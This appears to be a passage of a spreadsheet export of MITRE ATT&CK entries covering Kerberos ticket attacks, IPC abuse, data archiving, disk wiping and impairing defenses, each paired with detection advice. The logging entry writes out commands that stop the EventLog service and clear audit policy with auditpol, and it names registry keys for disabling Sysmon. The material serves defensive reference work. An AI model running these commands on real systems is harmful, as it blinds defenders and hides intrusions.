Monitor for unusual processes accessing &lt;code&gt;secrets.ldb&lt;/code&gt; and &lt;code&gt;.secrets.mkey&lt;/code&gt; located in &lt;code&gt;/var/lib/sss/secrets/&lt;/code&gt;.</t>
  </si>
  <si>
    <t>T1558.001</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request, Logon Session: Logon Session Metadata</t>
  </si>
  <si>
    <t>Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) 
Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)
The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)
Monitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)
Monitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. 
</t>
  </si>
  <si>
    <t>T1558.002</t>
  </si>
  <si>
    <t>Silver Ticket (T1558.002)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Metadata</t>
  </si>
  <si>
    <t>Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)
Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)
Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).</t>
  </si>
  <si>
    <t>Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) 
Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.</t>
  </si>
  <si>
    <t>T1558.003</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request</t>
  </si>
  <si>
    <t>Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 
Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)
Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)
This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)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t>
  </si>
  <si>
    <t>Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)</t>
  </si>
  <si>
    <t>T1558.004</t>
  </si>
  <si>
    <t>Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) 
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 Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)
For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)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Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)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t>
  </si>
  <si>
    <t>Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)</t>
  </si>
  <si>
    <t>T1558.005</t>
  </si>
  <si>
    <t>Ccache Files (T1558.005)</t>
  </si>
  <si>
    <t>File: File Access</t>
  </si>
  <si>
    <t xml:space="preserve">
Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. 
The &lt;code&gt;/etc/krb5.conf&lt;/code&gt; configuration file and the &lt;code&gt;KRB5CCNAME&lt;/code&gt; environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the `/tmp` directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS, ccache entries are stored by default in memory with an `API:{uuid}` naming scheme. Typically, users interact with ticket storage using &lt;code&gt;kinit&lt;/code&gt;, which obtains a Ticket-Granting-Ticket (TGT) for the principal; &lt;code&gt;klist&lt;/code&gt;, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense Kerberos Linux)
Adversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004). Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008). On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo) </t>
  </si>
  <si>
    <t>T1559</t>
  </si>
  <si>
    <t>Module: Module Load, Process: Process Access, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. 
Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)</t>
  </si>
  <si>
    <t>Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.</t>
  </si>
  <si>
    <t>T1559.001</t>
  </si>
  <si>
    <t>Component Object Model (T1559.001)</t>
  </si>
  <si>
    <t>Module: Module Load, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)
Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)
Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. </t>
  </si>
  <si>
    <t>T1559.002</t>
  </si>
  <si>
    <t>Dynamic Data Exchange (T1559.002)</t>
  </si>
  <si>
    <t>Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.
Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)
Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )
DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)</t>
  </si>
  <si>
    <t>Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).
OLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )</t>
  </si>
  <si>
    <t>T1559.003</t>
  </si>
  <si>
    <t>XPC Services (T1559.003)</t>
  </si>
  <si>
    <t>Process: Process Access</t>
  </si>
  <si>
    <t>Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service &lt;code&gt;C API&lt;/code&gt; or the high level &lt;code&gt;NSXPCConnection API&lt;/code&gt; in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)
Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).</t>
  </si>
  <si>
    <t>T1560</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.
Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.</t>
  </si>
  <si>
    <t>Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.
A process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.
Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)</t>
  </si>
  <si>
    <t>T1560.001</t>
  </si>
  <si>
    <t>Archive via Utility (T1560.001)</t>
  </si>
  <si>
    <t>Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.
Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as &lt;code&gt;tar&lt;/code&gt; on Linux and macOS or &lt;code&gt;zip&lt;/code&gt; on Windows systems. 
On Windows, &lt;code&gt;diantz&lt;/code&gt; or &lt;code&gt; makecab&lt;/code&gt; may be used to package collected files into a cabinet (.cab) file. &lt;code&gt;diantz&lt;/code&gt; may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) &lt;code&gt;xcopy&lt;/code&gt; on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. 
Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)</t>
  </si>
  <si>
    <t>Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.
Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)</t>
  </si>
  <si>
    <t>T1560.002</t>
  </si>
  <si>
    <t>Archive via Library (T1560.002)</t>
  </si>
  <si>
    <t>File: File Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.
Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.</t>
  </si>
  <si>
    <t>Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.
Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)</t>
  </si>
  <si>
    <t>T1560.003</t>
  </si>
  <si>
    <t>Archive via Custom Method (T1560.003)</t>
  </si>
  <si>
    <t>An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)</t>
  </si>
  <si>
    <t>Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.</t>
  </si>
  <si>
    <t>T1561</t>
  </si>
  <si>
    <t>Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.
To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks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
On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)</t>
  </si>
  <si>
    <t>Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the &lt;code&gt;\\\\.\\&lt;/code&gt; notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.</t>
  </si>
  <si>
    <t>T1561.001</t>
  </si>
  <si>
    <t>Disk Content Wipe (T1561.001)</t>
  </si>
  <si>
    <t>Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.
Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.
To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content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t>
  </si>
  <si>
    <t>Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the &lt;code&gt;\\\\.\\&lt;/code&gt; notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.
For network infrastructure devices, collect AAA logging to monitor for `erase` commands that delete critical configuration files.</t>
  </si>
  <si>
    <t>T1561.002</t>
  </si>
  <si>
    <t>Disk Structure Wipe (T1561.002)</t>
  </si>
  <si>
    <t>Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 
Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.
On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)
To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other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t>
  </si>
  <si>
    <t>Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the &lt;code&gt;\\\\.\\&lt;/code&gt; notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.
For network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device.</t>
  </si>
  <si>
    <t>T1562</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, Command: Command Execution, Driver: Driver Load, File: File Deletion, File: File Modification, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Process: OS API Execution, Process: Process Creation, Process: Process Modification, Process: Process Termination, Script: Script Execution, Sensor Health: Host Status, Service: Service Metadata, User Account: User Account Modification, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Containers, IaaS, Identity Provider, Linux, Network, Office Suite, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.
Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)
</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.
Monitor environment variables and APIs that can be leveraged to disable security measures.</t>
  </si>
  <si>
    <t>T1562.001</t>
  </si>
  <si>
    <t>Command: Command Execution, Driver: Driver Load, Process: Process Creation, Process: Process Termination, Sensor Health: Host Status, Service: Service Metadata, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)
Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) 
Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational&lt;/code&gt; may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) 
On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)
In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.
Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)
Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.
Lack of expected log events may be suspicious.</t>
  </si>
  <si>
    <t>T1562.002</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Process: Process Creation, Script: Script Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.
The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to &lt;code&gt;Security Settings\Local Policies\Audit Policy&lt;/code&gt; for basic audit policy settings or &lt;code&gt;Security Settings\Advanced Audit Policy Configuration&lt;/code&gt; for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) &lt;code&gt;auditpol.exe&lt;/code&gt; may also be used to set audit policies.(Citation: auditpol)
Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the &lt;code&gt;Set-Service -Name EventLog -Status Stopped&lt;/code&gt; or &lt;code&gt;sc config eventlog start=disabled&lt;/code&gt; commands (followed by manually stopping the service using &lt;code&gt;Stop-Service  -Name EventLog&lt;/code&gt;).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog&lt;/code&gt; then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)
There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the "Start" value in the key &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security&lt;/code&gt;, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System&lt;/code&gt; and &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application&lt;/code&gt; to disable the entire EventLog.(Citation: disable_win_evt_logging)
Additionally, adversaries may use &lt;code&gt;auditpol&lt;/code&gt; and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the &lt;code&gt;/success&lt;/code&gt; or &lt;code&gt;/failure&lt;/code&gt; parameters. For example, &lt;code&gt;auditpol /set /category:”Account Logon” /success:disable /failure:disable&lt;/code&gt; turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: &lt;code&gt;auditpol /clear /y&lt;/code&gt; or &lt;code&gt;auditpol /remove /allusers&lt;/code&gt;.(Citation: T1562.002_redcanaryco)
By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  
